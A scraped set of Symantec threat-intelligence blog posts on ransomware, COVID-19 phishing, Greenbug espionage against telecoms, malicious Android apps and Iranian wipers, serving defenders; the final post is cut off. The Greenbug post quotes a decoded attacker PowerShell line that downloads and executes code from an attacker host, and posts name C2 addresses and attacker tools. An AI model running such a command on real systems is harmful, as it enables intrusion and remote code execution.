    "content": "Researchers at Symantec, a division of Broadcom (NASDAQ: AVGO), have spotted a Sodinokibi targeted ransomware campaign in which the attackers are also scanning the networks of some victims for credit card or point of sale (PoS) software. It is not clear if the attackers are targeting this software for encryption or because they want to scrape this information as a way to make even more money from this attack. The attackers are using the Cobalt Strike commodity malware to deliver the Sodinokibi targeted ransomware to victims. Eight organizations had the Cobalt Strike commodity malware on their systems, with three of the victims subsequently infected with the Sodinokibi ransomware. The victims infected with Sodinokibi were in the services, food, and healthcare sectors. The companies targeted in this campaign were primarily large, even multinational, companies, which were likely targeted because the attackers believed they would be willing to pay a large ransom to recover access to their systems. The attackers are aiming to make a lot of money - for victims infected with Sodinokibi the ransom requested is $50,000 in the Monero cryptocurrency if paid within the first three hours, and $100,000 after that. The attackers leverage legitimate tools in these attacks, and at one point we observed a legitimate remote admin client tool by NetSupport Ltd being used to install components during these attacks. In April, Symantec threat researchers found evidence of Sodinokibi attackers using similar tactics, when they spotted them using a copy of the AnyDesk remote access tool to deliver malware and other tools in at least two attacks. The attackers in this campaign also use ‘legitimate’ infrastructure to store their payload and for their command and control (C&C) server. The attackers are using code-hosting service Pastebin to host their payload (the Cobalt Strike malware and Sodinokibi) and are using Amazon’s CloudFront service for their C&C infrastructure, to communicate with victim machines. Pastebin and CloudFront are both legitimate services but have been observed being exploited by bad actors for similar malicious activity in the past. The advantage for malicious actors of using legitimate services to host payloads and for their C&C infrastructure is that traffic to and from a legitimate service is more likely to blend in with an organization’s legitimate traffic, and so is less likely to be flagged as suspicious and blocked. Cobalt Strike is an off-the-shelf tool that can be used to load shellcode onto victim machines; it has legitimate uses as a penetration testing tool but is frequently exploited by malicious actors. The tactics used in this series of attacks are similar to tactics seen used in other targeted ransomware attacks before. Microsoft releasedresearchin April into attacks by six ransomware gangs, including Sodinokibi, and said that many of the groups employ similar tactics. The vector for most attacks observed by Microsoft was either the exploitation of vulnerable network devices or brute-force attacks on Remote Desktop Protocol (RDP) servers, and initial intrusion was followed by the use of living-off-the-land and commodity tools to perform credential theft and lateral movement before deploying the ransomware payload on multiple computers. So the tactics employed in this attack campaign are tactics commonly used by targeted ransomware gangs. Once on a network, the attackers take various steps to reduce the chance they will be detected and to increase the chances of their attack working. The attackers attempt to disable any security software on the machine so their activity can’t be detected. They also enable remote desktop connections so they can use them to launch malicious commands. The attackers also appear to be interested in stealing credentials on victim machines, and are observed adding user accounts, presumably in an attempt to maintain persistence on victim machines and also in a further attempt to keep a low profile on victim networks. We see the attackers using encoded PowerShell commands in some of these attacks. PowerShell is a Windows command line tool that has many legitimate purposes but is also frequently abused for nefarious purposes by malicious actors using living-off-the-land tactics. We see the Sodinokibi ransomware deployed on three of the victims that were infected with Cobalt Strike. Sodinokibi is a targeted ransomware - we saw targeted ransomware attacks increase by 62 percent in 2019, and targeted ransomware is one of the biggest threats on the cyber security landscape currently. Sodinokibi (aka REvil) first appeared in April 2019, but the actors behind it are widely believed to be the same actors who operated the GandCrab ransomware. GandCrab was a highly active targeted ransomware that first appeared in 2018. However, in June 2019 its operatorsannounced that they were ‘retiring’, claiming that they had made more than $2 billion from the ransomware. However, it’s widely thought that they simply turned their focus to the Sodinokibi ransomware instead. Sodinokibi was originally believed to be operated by one group but it is now thought to operate as a ransomware-as-a-service (RaaS), where one group maintains the code and rents it out to other groups, known as affiliates, who carry out attacks and spread the ransomware. Any profits made are then split between the affiliates and the original gang. Since it appeared on the scene, Sodinokibi has been one of the most prolific targeted ransomware strains and has been seen in numerous high-profile incidents. Actors using Sodinokibi were apparently responsible for thehack of foreign exchange service Travelexon New Year’s Eve. The attack left the company offline for almost a month and caused huge disruption to its business, according to public reports. The attackers were said to have demanded a ransom of $6 million in that incident, with Travelex reportedlyeventually paying $2.3 millionto regain access to its systems. In January, it was reported that Sodinokibi’saverage ransom demand was $260,000, so this was a huge ransom. Sodinokibi hit several other high-profile companies in the last year and, similar to the Maze ransomware group, announced in December 2019 that it would release data stolen from victims if its ransom demands weren’t met. Since that announcement, the gang has been observed offering the data of victims for sale on hacking forums, and at the beginning of Junean auction site was launchedwhere the group said it will sell off stolen data to the highest bidder. The three victims that were infected with Sodinokibi in this campaign were in the services, food, and healthcare sectors. The food and the services companies that were infected were both large, multi-site organizations that were likely capable of paying a large ransom - the type of company that would typically be targeted with Sodinokibi. However, the healthcare organization appears to have been a smaller operation. Interestingly, this victim’s systems were also scanned by the attackers for PoS software. It may be that the attackers realized this business might not be in a position to pay the large ransoms usually demanded in a Sodinokibi attack, and so scanned for PoS software to determine if they could profit from the compromise in another way, or they may have been scanning for this kind of software simply to encrypt it too. The attackers requested that the ransom be paid in the Monero cryptocurrency, which is favored for its privacy as, unlike Bitcoin, you cannot necessarily track transactions. For this reason we do not know if any of the victims paid the ransom, which was $50,000 if paid in the first three hours, rising to $100,000 after that time. While many of the elements of this attack are ‘typical’ tactics seen in previous attacks using Sodinokibi, the scanning of victim systems for PoS software is interesting, as this is not typically something you see happening alongside targeted ransomware attacks. It will be interesting to see if this was just opportunistic activity in this campaign, or if it is set to be a new tactic adopted by targeted ransomware gangs. One thing that is clear is the actors using Sodinokibi are sophisticated and skilled and show no sign that their activity is likely to decrease anytime soon. The companies targeted with this ransomware tend to be large corporate organizations, so companies like this need to be aware of the threat posed by this kind of activity.

    "content": "Towards the end of the first quarter of 2020, we took a look through telemetry from our vast range of data sources and selected some of the trends that stood out. From COVID-19-themed malicious email and BEC scams to vulnerability exploits and IoT attacks, let’s take a quick look at the trends that shaped the cyber security threat landscape in the first three months of 2020. While news of the coronavirus pandemic began to circulate in December 2019, it was March 2020 before the subject began to be used noticeably as a lure in malware-bearing emails. In February, Symantec, a division of Broadcom (NASDAQ: AVGO), blocked approximately 5,000 malicious emails with “coronavirus”, “corona”, or “COVID-19” in the subject line. However, in March this number increased significantly to roughly 82,000. More information on this trend can be found in our blogCOVID-19 Outbreak Prompts Opportunistic Wave of Malicious Email Campaigns. According to the FBI, business email compromise (BEC) scams are the most damaging and effective type of cyber crime, accounting for over $1.77 billion in losses for victims last year. While the number of organizations targeted by BEC scams was down from Q4 2019 numbers, there were still almost 31,000 organizations targeted in Q1 2020. The number of unique websites compromised with formjacking code increased in Q1 2020 as more criminals vie for their share of this lucrative malicious activity. There were 7,836 websites compromised with formjacking code in Q1 2020, up from 7,663 the previous quarter. To learn more about formjacking, read our white paper:How Malicious JavaScript Code is Stealing User Data from Thousands of Websites Each Month A directory traversal vulnerability in Citrix Application Delivery Controller and Citrix Gateway (CVE-2019-19781) was disclosed on December 17, 2019. Patches for the flaw, which could permit a remote attacker to execute arbitrary code on vulnerable computers, were not rolled out until January 2020. There was a spike in exploit attempts for this vulnerability immediately after its disclosure, peaking in February with over 492,000 attempts blocked by Symantec (Web Attack: Citrix ADC RCE CVE-2019-19781). Microsoft’s first Patch Tuesday release of 2020 disclosed a serious vulnerability in Windows CryptoAPI (CVE-2020-0601), a core component of the Windows operating system that handles cryptographic operations. Hackers were again quick to incorporate this vulnerability into their attacks, with blocked exploit attempts (Web Attack: Microsoft Windows CVE-2020-0601) reaching almost 82,500 in January. Attempts to exploit these vulnerabilities were blocked by Symantec’s Intrusion Prevention System (IPS). After declining markedly in 2019, phishing increased significantly during the first quarter of 2020, accounting for 1 in every 4,200 emails. Phishing activity is now back up to near where it was during 2018. The availability of more sophisticated phishing kits on the cyber underground may be driving a renewed interest in this form of attack. Some of the increase may also be accounted for by the upsurge in COVID-19-themed email attacks. The number of attacks against Symantec IOT honeypots* was up 13 percent in Q1 compared to Q4 of 2019. *Symantec’s IOT honeypots emulate protocols used by virtually all IOT devices, such as routers, connected cameras, digital video recorders, and so on. However, the number of unique IP addresses performing IOT attacks fell by 14 percent in the same period, indicating that while IoT botnets may be more aggressive in performing attacks, their relative size has fallen. The top ten passwords used in attacks on IOT devices. Most of the credentials used by attackers are default or easily guessable. The largest amount of attacks originated from IP addresses located in the U.S. followed by China, Vietnam, Taiwan, and South Korea. Since attacks are carried out by botnets of infected IOT devices, these countries have the highest number of infected IOT devices.

    "content": "As with all major newsworthy events, it was inevitable that criminals would take advantage of the COVID-19 pandemic. Symantec, a division of Broadcom (NASDAQ: AVGO), has already published blogs detailing how spammers and scammers are using coronavirus-themed lures in theirmalicious email campaigns, and how maliciousAndroid apps are also exploiting the outbreak. However, a more direct method to target people, and one that is arguably more trusted by users, is via text (SMS) messages sent to mobile phones. With this in mind, we analyzed links contained within more than 3 million SMS messages from hundreds of thousands of mobile devices from around the world that use Symantec’s mobile security technologies.Symantec Endpoint Protection Mobile(SEP Mobile) shields users from SMS phishing attempts by checking URLs found in text messages against the threat intelligence inSymantec WebPulse, part of the Symantec Global Intelligence Network (GIN), and alerting users when the links are suspect. While malicious SMS messages often use URL shortening services to evade detection and hide destination URLs that would otherwise appear risky, our technologies follow the attack trail to the final URL destination. We first began monitoring and evaluating the risk of COVID-19 related SMS messages soon after news of the virus began circulating in December 2019. We observed the first high-risk SMS phishing attack using COVID-19 as bait on January 24, 2020, roughly around the same period as the virus began to receive more media coverage. Up until March, we observed very few incidents of SMS phishing attacks using COVID-19 as bait. From late January to early March, only 1 in 500 (0.2 percent) COVID-19 related SMS messages were rated as high risk. However, COVID-19 SMS messages sent by scammers followed the same trend line as the coronavirus outbreak, which was officially declared a pandemic in March 2020. The number of high-risk COVID-19 SMS messages quickly increased after this, and by the third week of March, roughly 1 in 20 (5 percent) messages were categorized as a phishing attack or other type of high-risk attack. We observed several types of COVID-19 related SMS phishing scams. The criminals behind these scams all use the same tactic; taking advantage of people’s fears and financial hardships during the global pandemic in order to lure them in. The following are just three examples of financial-themed SMS phishing scams that use COVID-19 related lures (Note: Symantec’s mobile security technologies do not collect user-identifying information from SMS messages): Message:(Notification - ALERT ) Dear client, Scotiabank is working with the Government to make the Emergency Covid-19 Benefits deposits easier.

    "title": "greenbug espionage telco south asia",
    "link": "https://www.security.com/threat-intelligence/greenbug-espionage-telco-south-asia",
    "content": "The Greenbug espionage group is actively targeting telecommunications companies in South Asia, with activity seen as recently as April 2020. There are indications that at least one of the companies was first targeted as early as April 2019. Email appears to be the initial infection vector used by the group. Greenbug is using a mixture of off-the-shelf tools and living-off-the-land techniques in these attacks. It appears the group is interested in gaining access to database servers; we see it stealing credentials then testing connectivity to these servers using the stolen credentials. Greenbug is believed to likely be based out of Iran, and there has been speculation in the past that it has connections to the destructive Shamoon group, which has carried out disk-wiping attacks against organizations in Saudi Arabia. The Shamoon attacks have been extensively covered, but it wasnever clear how the attackers stole the credentials that allowed them to introduce their destructive malware onto victim systems. Research by Symantec, a division of Broadcom (NASDAQ: AVGO), in 2017 found evidence that Greenbug was on an organization’s network prior to a wiping attack that involved W32.Disttrack.B (Shamoon’s malware). This link was never definitively established, but cooperation between the two groups is considered a possibility. Much of the activity we saw in this attack campaign is in line with activity we have seen from Greenbug in the past, including the use of email as an initial infection vector, the use of publicly available hack tools like Mimikatz and Plink, and the apparent focus on collecting credentials and maintaining a persistent, low-profile presence on victim networks. Across multiple victim machines, a file named proposal_pakistan110.chm:error.html was executed via an internet browser. We also see the same file being opened by archiver tools. While we were unable to retrieve the file for analysis, the same technique has been leveraged by Greenbug in the past, as early as 2016. In these earlier attacks, emails were sent to targets containing a link to a likely compromised site, which hosted an archive file. This archive contains a malicious CHM file (compiled HTML Help file), which includes an ADS (alternative data steam) to hide its payload, which is installed when executed. This file usually also contains a decoy PDF file containing an error message that says the file could not be opened correctly. We have also seen similarly named files used in other organizations in the past to drop Trojan.Ismdoor, Greenbug’s custom malware. Around the same time as we saw this file, a file called GRUNTStager.hta was also executed. Symantec believes the attackers used the publically availableCovenant post-exploitation frameworkin order to gain an initial foothold in their target organizations. Covenant is a publicly available hack tool that is described as “a .NET command and control framework that aims to highlight the attack surface of .NET, make the use of offensive .NET tradecraft easier, and serve as a collaborative command and control platform.” It is described as being for use by “red teams,” but is also open to being abused by malicious actors. Greenbug was present on the systems of one organization from October 2019 to April 2020. It appeared to be interested in gaining access to the organization’s database server. The attackers were observed executing various PowerShell commands on the victim system. The first activity was seen on October 11, 2019, when a malicious PowerShell command was executed to install a CobaltStrike Beacon module to download the next stage payload. We were able to extract two command and control (C&C) server addresses from the PowerShell command. Initially, the attackers leveraged this access to execute PowerShell to determine the version of PowerShell installed via $PSVersionTable. After this, we observed the attackers proceed to attempt to download a malicious file hosted on the same previously mentioned C&C server. This command was executed several times but it is unclear if the attackers were successful. Approximately an hour later, the attackers were also observed attempting to perform a download to CSIDL_APPDATA\\a8f4.exe via the bitsadmin utility The BITS administration utility can be used to download or upload jobs to be executed. It is a legitimate tool that we commonly see abused by malicious actors. The attackers used this tool to download additional malicious tools to the compromised machine. A short time later, the attackers executed several tools from CSIDL_SYSTEM86\\[REDACTED] directory: The attackers were then seen launching PowerShell and attempting to execute a PowerShell script called msf.ps1. This command was executed several times and is likely used to install a Metasploit payload to retain access to the compromised machine. That is the last activity seen on that day. No further activity was observed until February 6, 2020, when a suspicious PowerShell command was executed. The PowerShell command follows the execution of the w3wp.exe process – an application that is used to serve requests to a web application. This may indicate that the attackers have used a webshell on the compromised machine. The following is a copy of the PowerShell command executed by the attackers: This command is used to search for files similar to web.config. For each file found, it extracts username and password information where possible, decrypting it using theaspnet_regiis.exeutility. These credentials may be used to access organizational resources such as SQL servers. Further activity was seen on February 12 and February 14. On February 12, the attackers returned and executed a tool:pls.exe. An hour later, the attackers bound cmd.exe to a listening port usingnetcatwith the following command: The same command was issued again about 20 minutes later. Two days later, at 7.29am local-time, the attackers returned and connected to the listening port, launching cmd.exe. They issued the following commands: The next day (February 15) the attackers returned to the command prompt and issued a command to add a user and then checked that the user was added. No further activity was observed until March 4, when a PowerShell command was launched at 6.30pm local time. A WMI command was also observed being executed and used to search for a specific account. Shortly after this, the well-known credential-stealing tool Mimikatz was executed from %USERPROFILE%\\documents\\x64. On March 11, the attackers attempted to connect to a database server via PowerShell, presumably using credentials they had stolen. The attackers also used an SQL command to retrieve the version information of the database server, presumably to test the credentials and connectivity. Further activity was seen in April. On April 8, suspicious PowerShell commands were observed attempting to download tools from a remote host. That was the only activity seen on April 8, then on April 13 PowerShell was launched and the following commands were observed being executed: Next, PowerShell was used to connect to a database server and check the version information, likely to confirm working credentials. This is similar to the previous PowerShell command observed with the exception of a different database server IP address. Finally, the attackers used PowerShell to view the current ARP table (IPs and hostname of machines that have recently been communicated with) via an arp -a command. That is the last activity we observed on this machine. A number of suspicious files were found on this machine (see IoCs). The files include the Covenant tool and Mimikatz, as already mentioned, as well as Cobalt Strike, an off-the-shelf tool that can be used to load shellcode onto victim machines, and multiple webshells. We saw suspicious activity on various machines on this same victim’s network. The attackers targeted several other users within the organization with the same file, proposal_pakistan110.chm:error.html, which was opened by an archiver tool and, in one instance, via the Microsoft Edge browser. Following this, we observed a backdoor being executed on the machine, alongside additional tools downloaded to the %APPDATA% directory from the attacker’s infrastructure. On one machine in this organization, we saw some suspicious PowerShell commands executed on December 9. One of the files executed by PowerShell, comms.exe, is Plink. A second similar command used the Bitvise command line tunneling client. Both tools are used to set up a tunnel to attacker-controlled infrastructure to allow Terminal Services and RDP access to an internal machine. Tools such as Plink and Bitvise are legitimate sysadmin tools, but have been seen being exploited by malicious actors before, includingby Iranian actors earlier this year. Plink was also seen on a second machine in this organization, which appears to have been compromised from November 2019 up to April 2020. The first suspicious activity on this machine was seen on November 13, when PowerShell Remoting was enabled on the machine to allow it to receive PowerShell commands. A PowerShell command was used to download a file from attacker controlled infrastructure and launch it with a specific argument. The argument decodes to /server=vsiegru.com /id=41. Shortly after this the Plink utility was executed to establish a connection to the victim network. A second PowerShell command was then executed as follows: The encoded argument decodes to the following: The attackers were then seen adding a user to the administrators group on this machine. Two further PowerShell commands were executed on the machine about a week later, on November 16. The first decodes to the following: iex ((New-Object Net.WebClient).DownloadString('http://apps[.]vvvnews.com:8080/Default.htt')) As the attackers have set up a tunnel, using the Plink tool, all connections appear to be routing to internal machine IP addresses. This was likely done as a means to evade detection. Greenbug’s activity in this campaign seems to make it clear that its main focus with these victims is to steal credentials, and to maintain a low profile on the victim’s network so the attackers can remain on it for a substantial period of time. This is typical of the activity we have seen in Greenbug victims in the past, with maintaining persistence on a victim network appearing to be one of the group’s primary goals. Greenbug has also been observed targeting telecoms companies in this same region in previous attack campaigns. The setting up of tunnels shows how important keeping a low-profile is for this group. Its focus on stealing credentials, and on establishing connections with database servers, shows that it is aiming to achieve a high level of access to a victim’s network - access that if exploited could cause havoc on a compromised network very quickly. This level of access, if leveraged by actors using disruptive malware or ransomware, could shut down an organization’s entire network very quickly. Previous victims of Greenbug have included organizations in the aviation, government, investment, and education sectors, as well as the telecoms sector, with attacks against telecoms organizations in the Middle East in 2017. In 2019, we observed 18 nation-state backed groups targeting the telecoms sector worldwide, so it seems to be an area of interest for sophisticated actors recently. It is probably not too hard to understand why the telecommunications industry, made up of phone providers and internet service providers (ISPs), is attractive to APT groups, whose main motivation is most often intelligence gathering. The access to calls, communications logs, and messages offered by telecoms companies makes them hugely valuable targets for these attackers. We can only speculate about Greenbug’s motives for targeting these specific telecoms companies, but it is clear that comprehensive and persistent access to victim networks remains the key priority for this group.

    "title": "covid 19 text scam",
    "link": "https://www.security.com/threat-intelligence/covid-19-text-scam",
    "content": "This is a follow-up to our previous blog onCOVID-19 related spam campaigns. This blog will share some insight on the latest wave of COVID-19 themed spam campaigns and how Email Threat Isolation (ETI) from Symantec stops these emails from accomplishing their goals. Symantec has continued to observe numerous malicious email campaigns taking advantage of the global panic surrounding the coronavirus outbreak. While we previously discussed malspam (malware bearing) emails, now a wave of text-based spam campaigns have emerged. These emails do not contain any malicious attachments and instead rely on what is written in the email to trick users into handing over information or money. According to Symantec telemetry, as well as COVID-19 related phishing and malspam campaigns, spammers are increasingly using text-based campaigns. One reason for this is that it is comparatively cheaper and easier than phishing and malspam campaigns as there is no need for compromised domains or malware. The most abused vanity TLDs used in these campaigns are .xyz, .top, and .site. These text-based spam campaigns include the following types of scams: One of the best solutions or defense mechanisms provided by Symantec to its customers is Email Threat Isolation (ETI). ETItechnology checks emails and attachments for phishing URLs or malicious content hosted on them. This technology de-risks the threat scenario by providing an extra layer of protection that allows users to safely browse unknown or shady websites, without risk of malware infection or credential theft. ETI is offered within the Symantec Email Security.cloud and Symantec Messaging Gateway solutions, and also as a standalone product that works with email security solutions from other vendors. Phishing emails masquerading as COVID-19 funding reports are being spread in spam campaigns. These emails try their best to trick recipients into clicking on links that lead to phishing web pages designed to steal credentials. Threat actors have designed convincing email templates that appear to come from reputable file-sharing/storage services and use them for their phishing campaigns. An example of this can be seen in Figure 2. The email content is kept short and mentions that a confidential document has been shared with the email recipient. In order to view the “Confidentiality.pdf” file, the user needs to click on “OPEN FILE”, beneath which a recently registered domain is used to form a phishing URL: https://[REMOVED]covid.com/ The phishing URL opens as a legitimate looking login page requesting the user to enter credentials. In Figure 3, Email Threat Isolation (ETI) alerts the user that the web page is potentially unsafe to visit and automatically enables the protected view with read-only mode. This helps to safeguard the user’s credentials or confidential information from being compromised. In Figure 4, a bogus email template is used to tell the recipient that a COVID-19 report file has been shared with them. When the “View” button is clicked, the user is brought to a phishing web page constructed with the help of a compromised domain: https://[REMOVED]/ssl/?@= These emails claim to come from small to medium-sized manufacturing firms, offering for sale a variety of medical equipment. The email templates used are kept simple and direct. As with many of these scam emails, there are often grammar, spelling, and punctuation errors present. In Figure 5, the threat actor provides a list of medical equipment specifying the type of respirators and masks available for purchase. The email also mentions that special chartered shipping services are available for VIP clients and provides shipping details. In Figure 6, the threat actor poses as a supplier from China keen to ship various types of face masks to different parts of the world with abundant stock ready to ship. This is another variation of the infamous advance fee scam. These emails are generally kept short and try to attract victims by offering generous monetary donations. In Figure 7, a generous wealthy couple is supposedly donating money for the Covid-19 relief effort. The email asks the recipient to provide personal details to a lawyer in order to claim the money. The email shown in Figure 8 is supposedly from the United Nations, in relation to COVID-19 relief. The email asks the recipient to verify their email address, which will then allow the sender to begin a conversation with the user and begin their scam. The subject line of this email starts with “Re:”, a tactic used to trick the recipient into thinking the message is a continuation of previous correspondence. These emails are themed as notification emails notifying the user they have been selected in a lottery to receive coronavirus compensation. In Figure 9, one of these emails asks the user to provide personal information before applying for their share of $1,000,000. These emails leverage cryptocurrencies and QR codes. The email shown in Figure 10 presents the recipient with a Bitcoin wallet address and a QR code to supposedly donate money or “food gift cards” to help with the coronavirus pandemic relief effort. Scanning the QR code brings up the same Bitcoin wallet listed in the email text. The email also lists an email address where all gift cards should be forwarded to. In Figure 11, the threat actor poses as a doctor and urges recipients to donate funds towards the COVID-19 Solidarity Response Fund, which will supposedly help with the production of a COVID-19 vaccine. Donations are requested to be paid to the provided Bitcoin wallet address. Snowshoe campaigns continue to be a firm favorite for spammers. These campaigns appear with heavy randomization in header fields to avoid detection. Snowshoe campaigns come in large batches in a short period of time. Along with heavy randomization of email features, these runs also use a myriad of topics and themes. In addition, these emails are distributed with a variety of originating IP addresses, domains with different gTLDs, and heavy obfuscation to avoid detection. In Figures 12 and 13, threat actors have made use of current affairs and designed their email templates accordingly. These include themes like “Elon Musk Reveals How to Profit from Coronavirus” and the promotion of a “Touch Free Body Thermometer.” Ultimately, the URLs hyperlinked beneath the words “Register now!” and “Browse Thermometers” contain newly registered spam domains. Predictive filtering systems focused on URL and other email features are deployed in timely intervals to catch changes in the rapidly changing email threat landscape. With the help of predictive filtering systems, threats that use email as a medium are filtered or blocked before they cause menace. This approach has also proved beneficial to detect the variation in these types of attacks and filter them down in terms of volume or scale. At Symantec, response teams strive hard to protect our valuable customers by introducing new defense mechanisms against such challenging attacks. An array of defense mechanisms is deployed in different layers at .cloud and Symantec Mail gateway level to block similar attacks.

    "title": "covid 19 outbreak prompts opportunistic wave malicious email campaigns",
    "link": "https://www.security.com/threat-intelligence/covid-19-outbreak-prompts-opportunistic-wave-malicious-email-campaigns",
    "content": "Cyber criminals are rushing to take advantage of the COVID-19 pandemic and in recent weeks Symantec has observed dozens of new malicious email campaigns attempting to leverage public fears about the virus. The threat actors behind these campaigns have employed a range of tactics in a bid to evade detection, such as using a variety of email templates along with heavy randomization of subject lines, “From” addresses, IP addresses, and URL domains. When analyzing email campaigns from the month of March, the first wave was dominated by phishing and malspam (malware bearing) emails. However, as the month moved onwards, snowshoe spam took over as the most common form of campaign, accounting for more than 40 percent of all emails blocked by Symantec. This was following by phishing (30 percent), malspam (18 percent), and scams (9 percent). There was a sharp uptick in the number of malicious emails blocked by Symantec on March 16, with a surge of spam runs focused around selling face masks, medical equipment, immunity oil, and other products related to COVID-19 virus outbreak. Interestingly, this increase closely corresponded with the increase in the number of COVID-19 infections recorded in in Europe and the U.S. This email is crafted to appear as a message from the U.S. Centers for Disease Control and Prevention (CDC). It explains that the CDC is closely monitoring the coronavirus outbreak and has established an Incident Management System to coordinate a domestic and international public health response. The recipient is then urged to click on a link that purports to lead to a list of new cases around their city. While the domain used in text appears to be “cdcinfo.gov”, hovering the cursor over the link will reveal the real, malicious URL the link leads to: When clicked, it routes to: In this spam run, the threat actor has made use of compromised domains to construct phishing URLs and has used a particular pattern – “/owa/owa.php?e=” in the URI path. The phishing URL opens a credential stealing webpage. Another phishing campaign observed by Symantec used quite a short template to masquerade as a legitimate business email. This email urges the recipient to review coronavirus funding proposals, with “Access to View File” hyperlinking to a legitimate online document editor/viewer hosting the phishing content. The URL given in the email is as follows: When opened, the document asks the viewer to enter their credentials. The use of legitimate file storage /sharing services and online document editors/viewers has increased rapidly from 2019 onwards, with threat actors leveraging these services because most of them are free. One example of a COVID-19 themed scam campaign seen by Symantec is an email pretending to come from the World Health Organization (WHO) and appears to be a classic example of advance fee fraud. In this case, the email claims that the WHO has approved of $550,000 in funding to be distributed to 50 people in the U.S. to be used for the prevention of outbreaks of the disease. In order to receive the funds, the recipient is asked to get in touch via email with an agency in order to negotiate the transfer. In most cases, if the victim does respond, the scammers will then attempt to trick them into paying a fee in order to “release” the funds. Another scam campaign features an attempt at extortion. The sender claims to be a neighbor of the recipient and says that they have been diagnosed with COVID-19 and are expecting to die. They then threaten to infect the recipient’s home unless they pay them. A Bitcoin wallet address is provided for the recipient to pay the extortion money. The Coronavirus outbreak has also prompted a surge in demand for masks and other protective clothing. One spam campaign Symantec observed claimed to come from a surgical mask supplier in China. The sender says that COVID-19 is almost gone in their country and they can now start to sell to other countries. One of the biggest snowshoe campaigns relating to the outbreak outlandishly offered “immunity oil” which could protect people from the virus. Snowshoe campaigns are bit different than the other spam campaigns. Snowshoe distributors use a variety of originating IP addresses, domains and obfuscation in the email template in order to avoid detection. One of the peculiar characteristics of snowshoe spam runs is that they involve massive amounts of emails in short intervals of time. Threat actors also use heavy randomization in header fields in order to avoid detection. In this example, the sender claims that a particular brand of oil can help to protect people from COVID-19 infection. This statement is supported by a news article which the threat actor has provided as an image in the email. A URL embedded within this image leads to spam content hosted on cloud storage – something a growing number of spammers are doing. Threat actors also register domains on different gTLDs, which are useful to send snowshoe runs in short intervals. These recently registered domains are used both in header fields and URLs. The most abused gTLDs observed in these snowshoe campaigns are:.biz, .cf, .info, .online, .xyz. Symantec provides leading predictive filtering system focused on URLs and other email features to detect and block changes in the rapidly changing email threat landscape. This technique has also proved beneficial to detect the variation in these types of attacks. The WHO also featured in a recent malspam campaign seen by Symantec. The email mentions that new research on COVID-19 has proven to be effective and the WHO has thus decided to share a .pdf file containing information on safety measures and preventive vaccination. The email comes with an attachment named “Covid19_UPDATE.rtf.zip” Inside this compressed file is a link (LNK file) with .rtf file extension which points to powershell.exe with obfuscated data as parameters. As soon as the obfuscated content is decrypted, it constructs a URL using “TinyURL” service. This URL downloads cookies to After this, it tries to visit the following URL: On execution, these files can be expected to download malicious content on user’s computer. While there is always a need to protect your organization against malicious emails, at a time of fear and doubt, this need becomes more pronounced. Predictive filtering systems focused on URL and other email features are deployed in timely intervals to catch changes in the rapidly changing email threat landscape. With the help of predictive filtering system, threats that use email as a medium are filtered or blocked before they cause menace. This approach has also proved beneficial to detect the variation in these types of attacks and filter them down in terms of volume or scale. At Symantec, response teams strive hard to protect our customers by introducing new defense mechanisms against such challenging attacks. An array of defense mechanisms are deployed in different layers at .cloud and Symantec Mail gateway level to block similar attacks.

    "link": "https://www.security.com/threat-intelligence/android-apps-coronavirus-covid19-malicious",
    "content": "On March 26, Symantec discovered 11 Android applications that were all made to appear like they were legitimate apps related to tracking cases in the Covid-19 pandemic, but which were in fact secretly downloading a malicious payload after installation. The coronavirus pandemic is the main news story all over the world right now, with hundreds of thousands of cases and thousands of deaths. These applications were created after March 20, a time when Covid-19 was spreading widely, particularly in Europe. From the apps’ user interface (UI)(see Figure 1)we can see these apps were targeting Italy, which has the most confirmed cases of Covid-19 in Europe, though it is now closely followed by Spain. However, even though it is clear the malicious apps were targeting Italy, we did also see them installed on devices in the U.S. and France as well. All 11 of the malicious apps we discovered were repacked versions of a legitimate app,SM_Covid19 app, which “assesses the risk of transmission of the virus by monitoring the number, duration and type of contacts [people have]”. The repacked apps kept many of the features of the original app, such as collecting location and device information for Covid-19 monitoring. However, we found that the repacked apps were also injected with Metasploit, which allows for a reverse TCP connection and for various commands to be executed. The attackers can retrieve the compromised device user’s file information, SMS messages, contacts and even take screenshots of what the device is displaying. The malware used also had a malicious module added that could download any payload from the attackers’ servers. This functionality means it would be possible for the attackers to perform the same attack on all users at the same time; it also means they could use all infected devices to create a botnet, potentially to do something such as perform a distributed denial of service (DDoS) attack or similar. The malicious apps’ ability to download any payload means they could in theory be used to infect a victim’s device with ransomware, infostealers, coinminers, or any other type of malware. After decrypting the app, we were able to find the IP address of the control server. After investigating the server address, we found that the server was also located in Italy. We also discovered that the attackers also used a second server IP [87.19.73.8] for attacks. This campaign shows that even at times of great global crisis attackers will try to take advantage of popular topics in an attempt to infect victims with malware, but there are some simple steps device users can take to help protect themselves from this type of activity. Always download and install applications from official websites and app stores only.

    "title": "tensions iran destructive attacks",
    "link": "https://www.security.com/threat-intelligence/tensions-iran-destructive-attacks",
    "content": "The recent upsurge in tensions between the U.S. and Iran has led to fears about an increase in both the frequency and aggressiveness of Iranian-sponsored cyber attacks. Iran has an extensive track record in this sphere, with government-backed cyber threat groups conducting numerous offensive cyber operations in recent years, including a number of highly destructive wiper attacks. While an uptick in such attacks is not a certainty, it is a distinct possibility and organizations should exercise extreme vigilance. The capabilities of Iranian actors have evolved rapidly in recent years, from quick and relatively simple destructive attacks, such as distributed denial‐of‐service (DDoS) attacks or website defacements, to an increased focus on network compromises where the actors maintain a persistent foothold and obfuscate their presence to make attribution difficult. Iranian groups have also increasingly targeted critical infrastructure including energy and telecommunications companies. Attackers associated with Iran have periodically carried out highly destructive disk-wiping attacks against targets in the Middle East. Historically, these attacks tend to coincide with periods of heightened instability in the region. Most of these destructive attacks have involved the Shamoon disk wiper (W32.Disttrack). Shamoonfirst emerged in 2012, when it was used in attacks against the Saudi energy sector. Itreappeared again in late 2016, when a slightly modified version (W32.Disttrack.B)was used in another wave of attacks against Saudi Arabia. A third wave of attacksoccurred in December 2018, when Shamoon was once again deployed against a range of targets in the Middle East. Unlike previous Shamoon attacks, these attacks involved a second piece of wiping malware (Trojan.Filerase). This malware deleted and overwrote files on the infected computer. Shamoon itself would meanwhile erase the master boot record (MBR) of the computer, rendering it unusable. Recent months have also seen the emergence of two new wipers, which appear to be evolutions of the original Shamoon wiper. The first, known as ZeroCleare (Trojan.Zerocleare) appeared in June and July of 2019, while in January 2020, theNational Cybersecurity Authority of Saudi Arabia released a reportabout a wiper malware they called Dustman. Dustman is a further evolution of ZeroCleare, where the authors optimized functionality into a single file instead of the way it worked in the June/July campaigns. While destructive attacks are an obvious source of concern, potential targets should be aware that the evidence available to date suggests that the Shamoon attackers may not have compromised their victims’ networks themselves. In the aftermath 